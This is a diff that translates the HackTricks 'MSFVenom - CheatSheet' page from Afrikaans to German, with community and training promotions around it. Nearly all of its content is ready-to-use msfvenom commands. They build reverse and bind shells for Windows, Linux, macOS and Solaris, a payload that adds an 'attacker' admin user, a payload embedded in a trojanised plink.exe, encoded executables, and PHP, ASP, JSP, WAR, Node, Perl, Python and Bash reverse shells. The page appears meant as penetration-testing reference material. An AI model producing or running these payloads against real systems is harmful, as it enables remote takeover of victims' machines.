@@ -1,49 +1,49 @@
 # MSFVenom - CheatSheet
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
-Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en bug bounty jagters!
+Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-Jägern zu kommunizieren!
 
-**Hacking Inligting**\
-Betrek met inhoud wat die opwinding en uitdagings van hacking ondersoek
+**Hacking Einblicke**\
+Engagieren Sie sich mit Inhalten, die in den Nervenkitzel und die Herausforderungen des Hackens eintauchen
 
-**Regte-Tyd Hack Nuus**\
-Bly op hoogte van die vinnige hacking wêreld deur regte-tyd nuus en insigte
+**Echtzeit-Hack-Nachrichten**\
+Bleiben Sie auf dem Laufenden über die schnelllebige Hacking-Welt durch Echtzeit-Nachrichten und Einblicke
 
-**Laaste Aankondigings**\
-Bly ingelig oor die nuutste bug bounties wat bekendgestel word en belangrike platform opdaterings
+**Neueste Ankündigungen**\
+Bleiben Sie informiert über die neuesten Bug-Bounties und wichtige Plattform-Updates
 
-**Sluit by ons aan op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!
+**Treten Sie uns auf** [**Discord**](https://discord.com/invite/N3FrSbmwdy) bei und beginnen Sie noch heute mit den besten Hackern zusammenzuarbeiten!
 
 ***
 
-## Basic msfvenom
+## Grundlegendes zu msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-Mens kan ook die `-a` gebruik om die argitektuur te spesifiseer of die `--platform`
+Man kann auch `-a` verwenden, um die Architektur oder `--platform` anzugeben.
 
-## Listing
+## Auflistung
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-## Algemene parameters wanneer 'n shellcode geskep word
+## Häufige Parameter beim Erstellen eines Shellcodes
 ```bash
 -b "\x00\x0a\x0d"
 -f c
@@ -53,7 +53,7 @@ PrependSetuid=True #Use this to create a shellcode that will execute something w
 ```
 ## **Windows**
 
-### **Terug Shell**
+### **Reverse Shell**
 
 {% code overflow="wrap" %}
 ```bash
@@ -67,19 +67,23 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```bash
 msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
 ```
-### Skep Gebruiker
+{% endcode %}
+
+### Benutzer erstellen
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```
-### CMD Shell
+{% endcode %}
+
+### CMD-Shell
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
-### **Voer Opdrag Uit**
+### **Befehl Ausführen**
 
 {% code overflow="wrap" %}
 ```bash
@@ -92,13 +96,15 @@ msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > enco
 ```
 {% endcode %}
 
-### Ingebed binne uitvoerbare
+### Eingebettet in ausführbare Dateien
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
-## Linux Payloads
+{% endcode %}
+
+## Linux-Payloads
 
 ### Reverse Shell
 
@@ -123,7 +129,7 @@ msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTAC
 ```
 {% endcode %}
 
-## **MAC Payloads**
+## **MAC-Payloads**
 
 ### **Reverse Shell:**
 
@@ -131,17 +137,21 @@ msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTAC
 ```bash
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
 ```
+{% endcode %}
+
 ### **Bind Shell**
+
+{% code overflow="wrap" %}
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
 {% endcode %}
 
-## **Web-gebaseerde Payloads**
+## **Webbasierte Payloads**
 
 ### **PHP**
 
-#### Terugskakel**l**
+#### Reverse shel**l**
 
 {% code overflow="wrap" %}
 ```bash
@@ -152,7 +162,7 @@ cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> s
 
 ### ASP/x
 
-#### Terug shell
+#### Reverse-Shell
 
 {% code overflow="wrap" %}
 ```bash
@@ -163,7 +173,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 
 ### JSP
 
-#### Terug shell
+#### Reverse-Shell
 
 {% code overflow="wrap" %}
 ```bash
@@ -171,9 +181,9 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f r
 ```
 {% endcode %}
 
-### OORLOG
+### KRIEG
 
-#### Terug Shell
+#### Reverse Shell
 
 {% code overflow="wrap" %}
 ```bash
@@ -185,7 +195,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Script Taal payloads**
+## **Script-Sprachen-Payloads**
 
 ### **Perl**
 
@@ -193,6 +203,8 @@ msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```bash
 msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
 ```
+{% endcode %}
+
 ### **Python**
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
@@ -205,30 +217,30 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 
 <figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
-Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om met ervare hackers en bug bounty jagters te kommunikeer!
+Tritt dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-Jägern zu kommunizieren!
 
-**Hacking Inligting**\
-Neem deel aan inhoud wat die opwinding en uitdagings van hacking ondersoek
+**Hacking Einblicke**\
+Engagiere dich mit Inhalten, die in den Nervenkitzel und die Herausforderungen des Hackens eintauchen
 
-**Regte Tyd Hack Nuus**\
-Bly op hoogte van die vinnige hacking wêreld deur middel van regte tyd nuus en insigte
+**Echtzeit Hack Nachrichten**\
+Bleibe auf dem Laufenden über die schnelllebige Welt des Hackens durch Echtzeitnachrichten und Einblicke
 
-**Laaste Aankondigings**\
-Bly ingelig oor die nuutste bug bounties wat bekendgestel word en belangrike platform opdaterings
+**Neueste Ankündigungen**\
+Bleibe informiert über die neuesten Bug-Bounties, die gestartet werden, und wichtige Plattform-Updates
 
-**Sluit by ons aan op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!
+**Tritt uns bei** [**Discord**](https://discord.com/invite/N3FrSbmwdy) und beginne noch heute mit den besten Hackern zusammenzuarbeiten!
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstütze HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
 {% endhint %}
